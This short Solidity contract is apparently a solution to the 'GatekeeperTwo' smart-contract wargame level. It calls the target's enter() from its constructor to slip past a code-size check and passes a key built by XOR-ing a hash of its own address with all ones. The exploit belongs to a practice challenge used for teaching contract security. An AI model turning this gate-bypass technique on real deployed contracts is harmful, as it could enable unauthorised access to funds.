pragma solidity ^0.6.0;
import '../GatekeeperTwo/GatekeeperTwo.sol';


contract AttackGatekeeperTwo {

  bytes8 public result;
	constructor(address _gatekeeperTwo) public {
		GatekeeperTwo gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
    result = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
    gatekeeperTwo.enter(result);
	}
}
